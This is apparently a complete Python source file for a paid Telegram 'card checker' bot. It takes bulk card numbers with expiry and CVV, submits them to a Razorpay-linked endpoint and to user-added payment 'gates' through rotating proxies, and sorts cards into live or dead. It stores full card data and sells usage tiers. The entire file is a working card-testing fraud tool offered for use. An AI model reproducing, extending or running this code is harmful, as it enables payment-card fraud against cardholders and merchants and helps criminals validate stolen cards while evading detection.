#!/usr/bin/env python3
"""
Premium Card Checker Telegram Bot - Full Feature Set
"""

import asyncio
import aiohttp
import sqlite3
import json
import random
import time
import os
import re
from datetime import datetime, timedelta
from urllib.parse import urlencode

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
except ImportError:
    os.system("pip install python-telegram-bot aiohttp")
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# ==================== CONFIG ====================
BOT_TOKEN = "YOUR_BOT_TOKEN"
OWNER_ID = 123456789  # Your Telegram user ID
DB_FILE = "premium_bot.db"

# ==================== DATABASE ====================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  plan TEXT DEFAULT 'BRONZE',
                  daily_limit INTEGER DEFAULT 15,
                  checked_today INTEGER DEFAULT 0,
                  last_check_date TEXT,
                  join_date TEXT,
                  expiry_date TEXT,
                  banned INTEGER DEFAULT 0)''')
    
    # Cards table
    c.execute('''CREATE TABLE IF NOT EXISTS cards
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  cc TEXT, month TEXT, year TEXT, cvv TEXT,
                  gate TEXT, site TEXT, status TEXT, response TEXT,
                  checked_at TEXT, proxy TEXT, bin_info TEXT)''')
    
    # Proxies table
    c.execute('''CREATE TABLE IF NOT EXISTS proxies
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  proxy TEXT UNIQUE,
                  added_by INTEGER,
                  alive INTEGER DEFAULT 1,
                  last_checked TEXT)''')
    
    # Sites/Gates table
    c.execute('''CREATE TABLE IF NOT EXISTS sites
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  name TEXT UNIQUE,
                  url TEXT,
                  method TEXT DEFAULT 'POST',
                  headers TEXT,
                  body_template TEXT,
                  success_keywords TEXT,
                  fail_keywords TEXT,
                  added_by INTEGER,
                  active INTEGER DEFAULT 1)''')
    
    conn.commit()
    conn.close()

# ==================== USER MANAGEMENT ====================
def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def register_user(user_id, username):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        INSERT OR IGNORE INTO users 
        (user_id, username, plan, daily_limit, join_date)
        VALUES (?, ?, 'BRONZE', 15, ?)
    """, (user_id, username, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def update_user_plan(user_id, plan, daily_limit=None, expiry_days=None):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    limits = {"BRONZE": 15, "SILVER": 50, "GOLD": 200, "PLATINUM": 1000, "VIP": 9999}
    
    if not daily_limit:
        daily_limit = limits.get(plan, 15)
    
    expiry = None
    if expiry_days:
        expiry = (datetime.now() + timedelta(days=expiry_days)).isoformat()
    
    c.execute("""
        UPDATE users SET plan = ?, daily_limit = ?, expiry_date = ?
        WHERE user_id = ?
    """, (plan, daily_limit, expiry, user_id))
    conn.commit()
    conn.close()

def increment_checks(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    today = datetime.now().strftime("%Y-%m-%d")
    
    c.execute("SELECT last_check_date, checked_today FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    
    if row:
        last_date, count = row
        if last_date == today:
            c.execute("UPDATE users SET checked_today = ? WHERE user_id = ?", (count + 1, user_id))
        else:
            c.execute("UPDATE users SET checked_today = 1, last_check_date = ? WHERE user_id = ?", (today, user_id))
    
    conn.commit()
    conn.close()

def can_check(user_id):
    user = get_user(user_id)
    if not user:
        return False, "User not registered"
    
    if user[8]:  # banned
        return False, "You are banned"
    
    today = datetime.now().strftime("%Y-%m-%d")
    last_date = user[6] if len(user) > 6 else ""
    
    if last_date == today and user[5] >= user[4]:
        return False, f"Daily limit reached ({user[4]}/{user[4]})"
    
    return True, f"OK ({user[5] if last_date == today else 0}/{user[4]})"

# ==================== PROXY MANAGEMENT ====================
def add_proxy(proxy, added_by=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute("INSERT OR IGNORE INTO proxies (proxy, added_by) VALUES (?, ?)", (proxy, added_by))
        conn.commit()
        conn.close()
        return True
    except:
        conn.close()
        return False

def remove_proxy(proxy):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM proxies WHERE proxy = ?", (proxy,))
    conn.commit()
    conn.close()

def get_proxies(alive_only=True):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    if alive_only:
        c.execute("SELECT proxy FROM proxies WHERE alive = 1")
    else:
        c.execute("SELECT proxy FROM proxies")
    proxies = [row[0] for row in c.fetchall()]
    conn.close()
    return proxies

def get_random_proxy():
    proxies = get_proxies()
    return random.choice(proxies) if proxies else ""

# ==================== SITE/GATE MANAGEMENT ====================
def add_site(name, url, method, headers, body_template, success_kw, fail_kw, added_by=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute("""
            INSERT OR REPLACE INTO sites 
            (name, url, method, headers, body_template, success_keywords, fail_keywords, added_by)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (name, url, method, json.dumps(headers), body_template, success_kw, fail_kw, added_by))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        conn.close()
        return False, str(e)

def remove_site(name):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM sites WHERE name = ?", (name,))
    conn.commit()
    conn.close()

def get_sites(active_only=True):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    if active_only:
        c.execute("SELECT name, url, method, headers, body_template, success_keywords, fail_keywords FROM sites WHERE active = 1")
    else:
        c.execute("SELECT name, url, method, headers, body_template, success_keywords, fail_keywords FROM sites")
    sites = c.fetchall()
    conn.close()
    return sites

# ==================== CARD PARSING ====================
def parse_card(text):
    text = text.strip()
    separators = ["|", "~", "/", ":", ";", " "]
    
    for sep in separators:
        parts = text.split(sep)
        parts = [p.strip() for p in parts if p.strip()]
        if len(parts) >= 4:
            cc = re.sub(r'\D', '', parts[0])
            if not (13 <= len(cc) <= 19):
                continue
            month = parts[1].zfill(2)
            year = parts[2]
            if len(year) == 2:
                year = "20" + year
            cvv = parts[3]
            return cc, month, year, cvv
    return None

def parse_bulk(text):
    cards = []
    for line in text.strip().split("\n"):
        line = line.strip()
        if not line:
            continue
        parsed = parse_card(line)
        if parsed:
            cards.append(parsed)
    return cards

def luhn_check(cc):
    try:
        digits = [int(d) for d in str(cc) if d.isdigit()]
        if len(digits) < 13 or len(digits) > 19:
            return False
        check_digit = digits.pop()
        digits.reverse()
        total = 0
        for i, d in enumerate(digits):
            if i % 2 == 0:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        return (total + check_digit) % 10 == 0
    except:
        return False

def get_bin_info(cc):
    """Get BIN details"""
    bin_num = cc[:6]
    # Basic BIN database
    bins = {
        "4": {"brand": "Visa", "type": "Credit"},
        "5": {"brand": "Mastercard", "type": "Credit"},
        "3": {"brand": "Amex", "type": "Credit"},
        "6": {"brand": "Discover", "type": "Credit"},
    }
    
    info = bins.get(bin_num[0], {"brand": "Unknown", "type": "Unknown"})
    info["bin"] = bin_num
    info["bank"] = "Unknown"
    info["country"] = "Unknown"
    
    return info

# ==================== CHECKER ENGINE ====================
class CheckerEngine:
    async def check_site(self, session, site, cc, month, year, cvv, proxy=""):
        """Check card against a custom site configuration"""
        name, url, method, headers_json, body_template, success_kw, fail_kw = site
        
        headers = json.loads(headers_json) if headers_json else {}
        
        # Replace placeholders in body
        body = body_template if body_template else ""
        body = body.replace("{cc}", cc)
        body = body.replace("{month}", month)
        body = body.replace("{year}", year)
        body = body.replace("{cvv}", cvv)
        body = body.replace("{bin}", cc[:6])
        body = body.replace("{last4}", cc[-4:])
        
        proxy_url = f"http://{proxy}" if proxy else None
        
        try:
            if method.upper() == "GET":
                async with session.get(url, headers=headers, params=body if body else None,
                                       proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    text = await resp.text()
            else:
                content_type = headers.get("Content-Type", "")
                if "json" in content_type:
                    async with session.post(url, headers=headers, json=json.loads(body) if body else {},
                                           proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        text = await resp.text()
                else:
                    async with session.post(url, headers=headers, data=body,
                                           proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        text = await resp.text()
            
            # Check keywords
            text_lower = text.lower()
            
            if success_kw and any(kw.lower() in text_lower for kw in success_kw.split(",")):
                return ("LIVE", text[:300])
            elif fail_kw and any(kw.lower() in text_lower for kw in fail_kw.split(",")):
                return ("DEAD", text[:300])
            elif "success" in text_lower or "approved" in text_lower or "live" in text_lower:
                return ("LIVE", text[:300])
            elif "declined" in text_lower or "insufficient" in text_lower or "dead" in text_lower:
                return ("DEAD", text[:300])
            else:
                return ("UNKNOWN", text[:300])
                
        except asyncio.TimeoutError:
            return ("TIMEOUT", "Request timed out")
        except Exception as e:
            return ("ERROR", str(e))
    
    async def check_razorpay(self, session, cc, month, year, cvv, proxy=""):
        """Razorpay auto-checker"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://rz.rcvan.indevs.in",
            "Referer": "https://rz.rcvan.indevs.in/rz",
        }
        
        data = {
            "cc": cc,
            "month": month,
            "year": year,
            "cvv": cvv,
            "amount": "100",
            "currency": "INR",
        }
        
        proxy_url = f"http://{proxy}" if proxy else None
        
        try:
            async with session.post(
                "https://rz.rcvan.indevs.in/rz",
                headers=headers,
                data=data,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as resp:
                text = await resp.text()
                
                if "success" in text.lower() or "approved" in text.lower() or "captured" in text.lower():
                    return ("✅ LIVE", text[:200])
                elif "cancelled" in text.lower() or "dead" in text.lower():
                    return ("💀 DEAD", text[:200])
                elif "cvv" in text.lower() and ("invalid" in text.lower() or "wrong" in text.lower()):
                    return ("⚠️ CCN", text[:200])
                elif "insufficient" in text.lower():
                    return ("💳 INSUFFICIENT", text[:200])
                else:
                    return ("❌ DECLINED", text[:200])
        except asyncio.TimeoutError:
            return ("⏰ TIMEOUT", "Timeout")
        except Exception as e:
            return ("🔴 ERROR", str(e))

# ==================== BOT HANDLERS ====================
engine = CheckerEngine()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    register_user(user.id, user.username or user.first_name)
    
    text = f"""╔══════════════════════╗
║      ⭐ CHECKER BOT ⭐      ║
╚══════════════════════╝

╔═══ 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎 ═══╗
║ /sp ━ Single CC      ║
║ /msp ━ Mass CC (tct)  ║
║ /chkgate ━ Custom gate║
╚══════════════════════╝

╔═══ 𝙎𝙄𝙏𝙀𝙎 ═══╗
║ /add ━ Add site      ║
║ /rm ━ Remove site    ║
║ /sites ━ View sites  ║
║ /site ━ Test all     ║
╚══════════════════════╝

╔═══ 𝙋𝙍𝙊𝙓𝙔 ═══╗
║ /addpxy ━ Add proxy ║
║ /proxy ━ View       ║
║ /chkpxy ━ Test      ║
║ /rmpxy ━ Remove     ║
╚══════════════════════╝

╔═══ 𝘼𝘾𝘾𝙊𝙐𝙉𝙏 ═══╗
║ /info ━ Profile     ║
║ /plan ━ Plans       ║
╚══════════════════════╝

𝘚𝘛𝘈𝘛𝘜𝘚 ━ 🆓 𝘉𝘙𝘖𝘕𝘡𝘌 (15/𝘥𝘢𝘺)"""
    
    await update.message.reply_text(text)

async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sp - Single card check"""
    user_id = update.effective_user.id
    allowed, msg = can_check(user_id)
    
    if not allowed:
        await update.message.reply_text(f"❌ {msg}")
        return
    
    text = " ".join(context.args) if context.args else ""
    
    # Check if replying to a message
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text
    
    if not text:
        await update.message.reply_text("Usage: /sp cc|mm|yy|cvv")
        return
    
    parsed = parse_card(text)
    if not parsed:
        await update.message.reply_text("❌ Invalid format. Use: cc|mm|yy|cvv")
        return
    
    cc, month, year, cvv = parsed
    
    if not luhn_check(cc):
        await update.message.reply_text("❌ Invalid card number")
        return
    
    bin_info = get_bin_info(cc)
    proxy = get_random_proxy()
    
    msg = await update.message.reply_text(
        f"⏳ Checking...\n"
        f"`{cc[:6]}xxxxxx{cc[-4:]}|{month}|{year}|{cvv}`\n"
        f"💳 {bin_info['brand']} {bin_info['type']} | BIN: {bin_info['bin']}"
    )
    
    async with aiohttp.ClientSession() as session:
        status, response = await engine.check_razorpay(session, cc, month, year, cvv, proxy)
    
    increment_checks(user_id)
    
    # Save to DB
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        INSERT INTO cards (user_id, cc, month, year, cvv, gate, status, response, checked_at, proxy, bin_info)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (user_id, cc, month, year, cvv, "razorpay", status, response[:200], 
          datetime.now().isoformat(), proxy, json.dumps(bin_info)))
    conn.commit()
    conn.close()
    
    # Emoji for status
    emoji = ""
    if "✅" in status: emoji = "✅"
    elif "⚠️" in status: emoji = "⚠️"
    elif "💀" in status: emoji = "💀"
    elif "❌" in status: emoji = "❌"
    elif "⏰" in status: emoji = "⏰"
    elif "🔴" in status: emoji = "🔴"
    
    await msg.edit_text(
        f"{emoji} *Result*\n\n"
        f"💳 `{cc[:6]}xxxxxx{cc[-4:]}|{month}|{year}|{cvv}`\n"
        f"🏦 {bin_info['brand']} - {bin_info['type']}\n"
        f"🔢 BIN: `{bin_info['bin']}`\n"
        f"📊 *Status:* `{status}`\n"
        f"🖥️ *Proxy:* `{proxy[:20]}...`\n"
        f"📝 *Response:* `{response[:150]}`",
        parse_mode="Markdown"
    )

async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/msp - Mass check from .tct file"""
    user_id = update.effective_user.id
    allowed, msg = can_check(user_id)
    
    if not allowed:
        await update.message.reply_text(f"❌ {msg}")
        return
    
    # Check for file attachment
    if update.message.document:
        file = await update.message.document.get_file()
        await file.download_to_drive("temp_cards.txt")
        
        with open("temp_cards.txt", "r") as f:
            content = f.read()
        
        os.remove("temp_cards.txt")
    elif update.message.reply_to_message:
        content = update.message.reply_to_message.text
    else:
        content = update.message.text.replace("/msp", "", 1).strip()
    
    if not content:
        await update.message.reply_text("Reply to a message with cards or attach a .tct file")
        return
    
    cards = parse_bulk(content)
    valid_cards = [(cc, m, y, cv) for cc, m, y, cv in cards if luhn_check(cc)]
    
    if not valid_cards:
        await update.message.reply_text("No valid cards found")
        return
    
    # Check daily limit
    user = get_user(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    remaining = user[4] - (user[5] if user[6] == today else 0)
    
    if remaining <= 0:
        await update.message.reply_text("❌ Daily limit reached")
        return
    
    if len(valid_cards) > remaining:
        valid_cards = valid_cards[:remaining]
    
    msg = await update.message.reply_text(
        f"⏳ Checking {len(valid_cards)} cards...\n"
        f"📊 Limit: {remaining} remaining today\n\n"
        f"Progress: 0/{len(valid_cards)}"
    )
    
    async with aiohttp.ClientSession() as session:
        results = []
        for i, (cc, month, year, cvv) in enumerate(valid_cards):
            proxy = get_random_proxy()
            status, response = await engine.check_razorpay(session, cc, month, year, cvv, proxy)
            increment_checks(user_id)
            
            bin_info = get_bin_info(cc)
            
            # Save to DB
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("""
                INSERT INTO cards (user_id, cc, month, year, cvv, gate, status, response, checked_at, proxy, bin_info)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (user_id, cc, month, year, cvv, "razorpay", status, response[:200],
                  datetime.now().isoformat(), proxy, json.dumps(bin_info)))
            conn.commit()
            conn.close()
            
            results.append(f"{status} `{cc[:6]}xxxxxx{cc[-4:]}|{month}|{year}|{cvv}`")
            
            if (i + 1) % 5 == 0 or i == len(valid_cards) - 1:
                live_count = sum(1 for r in results if "✅" in r)
                ccn_count = sum(1 for r in results if "⚠️" in r)
                await msg.edit_text(
                    f"⏳ Checking {len(valid_cards)} cards...\n"
                    f"✅ Live: {live_count} | ⚠️ CCN: {ccn_count}\n\n"
                    f"Progress: {i+1}/{len(valid_cards)}\n\n" +
                    "\n".join(results[-10:])
                )
    
    live = sum(1 for r in results if "✅" in r)
    ccn = sum(1 for r in results if "⚠️" in r)
    dead = sum(1 for r in results if "💀" in r or "❌" in r)
    
    final = f"✅ *Mass Check Complete*\n\nChecked: {len(results)}\n✅ Live: {live}\n⚠️ CCN: {ccn}\n💀 Dead: {dead}\n\n" + "\n".join(results)
    
    if len(final) > 4000:
        with open("results.txt", "w") as f:
            f.write(final)
        await update.message.reply_document(
            document=open("results.txt", "rb"),
            caption=f"📊 Results: {len(results)} cards | ✅ {live} | ⚠️ {ccn} | 💀 {dead}"
        )
        os.remove("results.txt")
    else:
        await msg.edit_text(final, parse_mode="Markdown")

async def add_site_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/add - Add custom site"""
    if not context.args:
        await update.message.reply_text(
            "Usage: /add name|url|method|headers_json|body|success_kw|fail_kw\n\n"
            "Placeholders: {cc} {month} {year} {cvv} {bin} {last4}\n\n"
            "Example:\n"
            "/add MyGate|https://api.example.com/charge|POST|{\\\"Content-Type\\\":\\\"application/json\\\"}|{\\\"card\\\":{\\\"number\\\":\\\"{cc}\\\",\\\"exp\\\":\\\"{month}/{year}\\\",\\\"cvv\\\":\\\"{cvv}\\\"}}|success,captured|declined,failed"
        )
        return
    
    text = " ".join(context.args)
    parts = text.split("|", 6)
    
    if len(parts) < 2:
        await update.message.reply_text("Need at least: name|url")
        return
    
    name = parts[0].strip()
    url = parts[1].strip()
    method = parts[2].strip() if len(parts) > 2 else "POST"
    headers = parts[3].strip() if len(parts) > 3 else '{"Content-Type":"application/x-www-form-urlencoded"}'
    body = parts[4].strip() if len(parts) > 4 else "{cc}|{month}|{year}|{cvv}"
    success_kw = parts[5].strip() if len(parts) > 5 else "success,approved"
    fail_kw = parts[6].strip() if len(parts) > 6 else "declined,failed,error"
    
    result = add_site(name, url, method, json.loads(headers), body, success_kw, fail_kw, update.effective_user.id)
    
    if result is True:
        await update.message.reply_text(f"✅ Site `{name}` added successfully!")
    else:
        await update.message.reply_text(f"❌ Error: {result[1]}")

async def remove_site_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/rm - Remove site"""
    if not context.args:
        await update.message.reply_text("Usage: /rm sitename")
        return
    
    name = " ".join(context.args)
    remove_site(name)
    await update.message.reply_text(f"✅ Site `{name}` removed")

async def list_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sites - View all sites"""
    sites = get_sites()
    
    if not sites:
        await update.message.reply_text("No sites configured.\nUse /add to add one.")
        return
    
    lines = ["📋 *Configured Sites:*\n"]
    for i, site in enumerate(sites, 1):
        name, url, method = site[0], site[1], site[2]
        lines.append(f"{i}. `{name}` - {method} {url[:50]}...")
    
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def test_all_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/site - Test card against all sites"""
    user_id = update.effective_user.id
    allowed, msg = can_check(user_id)
    
    if not allowed:
        await update.message.reply_text(f"❌ {msg}")
        return
    
    text = " ".join(context.args) if context.args else ""
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text
    
    if not text:
        await update.message.reply_text("Usage: /site cc|mm|yy|cvv")
        return
    
    parsed = parse_card(text)
    if not parsed:
        await update.message.reply_text("❌ Invalid format")
        return
    
    cc, month, year, cvv = parsed
    
    sites = get_sites()
    if not sites:
        await update.message.reply_text("No sites configured. Use /add first.")
        return
    
    msg = await update.message.reply_text(f"⏳ Testing against {len(sites)} sites...")
    
    results = []
    async with aiohttp.ClientSession() as session:
        for i, site in enumerate(sites):
            proxy = get_random_proxy()
            status, response = await engine.check_site(session, site, cc, month, year, cvv, proxy)
            results.append(f"`{site[0]}`: {status}")
            
            if (i + 1) % 3 == 0:
                await msg.edit_text(f"⏳ Testing...\n{chr(10).join(results[-3:])}")
    
    increment_checks(user_id)
    
    await msg.edit_text(
        f"✅ *All Sites Tested*\n\n"
        f"💳 `{cc[:6]}xxxxxx{cc[-4:]}|{month}|{year}|{cvv}`\n\n" +
        "\n".join(results),
        parse_mode="Markdown"
    )

async def add_proxy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/addpxy - Add proxy"""
    if not context.args:
        await update.message.reply_text("Usage: /addpxy user:pass@ip:port\nOr /addpxy multiple proxies (one per line)")
        return
    
    text = " ".join(context.args)
    proxies = text.replace("\n", " ").split()
    
    added = 0
    for p in proxies:
        p = p.strip()
        if p and ":" in p:
            if add_proxy(p, update.effective_user.id):
                added += 1
    
    await update.message.reply_text(f"✅ Added {added} proxy/proxies")

async def view_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/proxy - View proxies"""
    proxies = get_proxies(alive_only=False)
    
    if not proxies:
        await update.message.reply_text("No proxies. Use /addpxy to add.")
        return
    
    alive = get_proxies(alive_only=True)
    lines = [f"📋 *Proxies:* ({len(alive)} alive / {len(proxies)} total)\n"]
    for p in proxies[:20]:  # Show first 20
        lines.append(f"`{p[:40]}...`")
    
    if len(proxies) > 20:
        lines.append(f"\n... and {len(proxies) - 20} more")
    
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def check_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/chkpxy - Test proxies"""
    proxies = get_proxies()
    
    if not proxies:
        await update.message.reply_text("No proxies to test")
        return
    
    msg = await update.message.reply_text(f"⏳ Testing {len(proxies)} proxies...")
    
    alive_count = 0
    dead_count = 0
    results = []
    
    async def test_proxy(proxy):
        nonlocal alive_count, dead_count
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://httpbin.org/ip", 
                                      proxy=f"http://{proxy}", 
                                      timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        conn = sqlite3.connect(DB_FILE)
                        c = conn.cursor()
                        c.execute("UPDATE proxies SET alive = 1, last_checked = ? WHERE proxy = ?",
                                 (datetime.now().isoformat(), proxy))
                        conn.commit()
                        conn.close()
                        alive_count += 1
                        return f"✅ `{proxy[:30]}...` - ALIVE"
                    else:
                        raise Exception("Dead")
        except:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("UPDATE proxies SET alive = 0, last_checked = ? WHERE proxy = ?",
                     (datetime.now().isoformat(), proxy))
            conn.commit()
            conn.close()
            dead_count += 1
            return f"❌ `{proxy[:30]}...` - DEAD"
    
    # Test in batches of 5
    for i in range(0, len(proxies), 5):
        batch = proxies[i:i+5]
        tasks = [test_proxy(p) for p in batch]
        batch_results = await asyncio.gather(*tasks)
        results.extend(batch_results)
        
        await msg.edit_text(
            f"⏳ Testing proxies...\n"
            f"✅ Alive: {alive_count} | ❌ Dead: {dead_count}\n"
            f"Progress: {min(i+5, len(proxies))}/{len(proxies)}\n\n" +
            "\n".join(results[-5:])
        )
    
    await msg.edit_text(
        f"✅ *Proxy Test Complete*\n\n"
        f"Total: {len(proxies)}\n"
        f"✅ Alive: {alive_count}\n"
        f"❌ Dead: {dead_count}"
    )

async def remove_proxy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/rmpxy - Remove proxy"""
    if not context.args:
        await update.message.reply_text("Usage: /rmpxy proxy")
        return
    
    proxy = " ".join(context.args)
    remove_proxy(proxy)
    await update.message.reply_text(f"✅ Removed proxy")

async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/info - User profile"""
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user:
        await update.message.reply_text("Not registered. Use /start")
        return
    
    _, username, plan, daily_limit, checked_today, last_date, join_date, expiry, banned = user
    
    today = datetime.now().strftime("%Y-%m-%d")
    checks_used = checked_today if last_date == today else 0
    
    lines = [
        f"👤 *Profile*",
        f"User: @{username or 'None'}",
        f"ID: `{user_id}`",
        f"",
        f"📊 *Plan:* `{plan}`",
        f"📅 Joined: `{join_date[:10] if join_date else 'N/A'}`",
        f"⏰ Expires: `{expiry[:10] if expiry else 'Never'}`",
        f"",
        f"📈 *Daily Usage:* `{checks_used}/{daily_limit}`",
        f"🔴 Banned: `{'Yes' if banned else 'No'}`",
    ]
    
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/plan - View plans"""
    text = """📋 *Available Plans*

🆓 *BRONZE* - FREE
• 15 checks/day
• Razorpay only
• Basic support

🥈 *SILVER* - $5/mo
• 50 checks/day
• All gates
• Proxy support

🥇 *GOLD* - $15/mo
• 200 checks/day
• Custom sites
• Priority support

💎 *PLATINUM* - $50/mo
• 1000 checks/day
• All features
• API access

👑 *VIP* - $100/mo
• Unlimited
• Custom development
• 24/7 support

Contact @admin for upgrades"""
    
    await update.message.reply_text(text, parse_mode="Markdown")

# ==================== ADMIN COMMANDS ====================
async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: ban user"""
    if update.effective_user.id != OWNER_ID:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /ban user_id")
        return
    
    target_id = int(context.args[0])
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET banned = 1 WHERE user_id = ?", (target_id,))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ Banned user {target_id}")

async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: unban user"""
    if update.effective_user.id != OWNER_ID:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /unban user_id")
        return
    
    target_id = int(context.args[0])
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET banned = 0 WHERE user_id = ?", (target_id,))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ Unbanned user {target_id}")

async def admin_setplan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: set user plan"""
    if update.effective_user.id != OWNER_ID:
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /setplan user_id plan [days]")
        return
    
    target_id = int(context.args[0])
    plan = context.args[1].upper()
    days = int(context.args[2]) if len(context.args) > 2 else None
    
    update_user_plan(target_id, plan, expiry_days=days)
    await update.message.reply_text(f"✅ Set user {target_id} to {plan} plan" + (f" for {days} days" if days else ""))

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: bot statistics"""
    if update.effective_user.id != OWNER_ID:
        return
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM cards")
    total_checks = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM cards WHERE status LIKE '%LIVE%'")
    live = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM proxies")
    total_proxies = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM proxies WHERE alive = 1")
    alive_proxies = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM sites")
    total_sites = c.fetchone()[0]
    
    conn.close()
    
    text = f"""📊 *Bot Statistics*

👤 Users: `{total_users}`
💳 Total Checks: `{total_checks}`
✅ Live Cards: `{live}`
🖥️ Proxies: `{alive_proxies}/{total_proxies}`
🌐 Sites: `{total_sites}`"""
    
    await update.message.reply_text(text, parse_mode="Markdown")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .tct file upload"""
    if not update.message.document.file_name.endswith(('.tct', '.txt', '.csv')):
        await update.message.reply_text("Please upload a .tct, .txt, or .csv file")
        return
    
    # Trigger mass check
    await mass_check(update, context)

# ==================== MAIN ====================
def main():
    init_db()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sp", single_check))
    app.add_handler(CommandHandler("msp", mass_check))
    app.add_handler(CommandHandler("add", add_site_handler))
    app.add_handler(CommandHandler("rm", remove_site_handler))
    app.add_handler(CommandHandler("sites", list_sites))
    app.add_handler(CommandHandler("site", test_all_sites))
    app.add_handler(CommandHandler("addpxy", add_proxy_handler))
    app.add_handler(CommandHandler("proxy", view_proxies))
    app.add_handler(CommandHandler("chkpxy", check_proxies))
    app.add_handler(CommandHandler("rmpxy", remove_proxy_handler))
    app.add_handler(CommandHandler("info", user_info))
    app.add_handler(CommandHandler("plan", plans))
    
    # Admin commands
    app.add_handler(CommandHandler("ban", admin_ban))
    app.add_handler(CommandHandler("unban", admin_unban))
    app.add_handler(CommandHandler("setplan", admin_setplan))
    app.add_handler(CommandHandler("adminstats", admin_stats))
    
    # File handler
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    print("🤖 Premium Checker Bot started!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
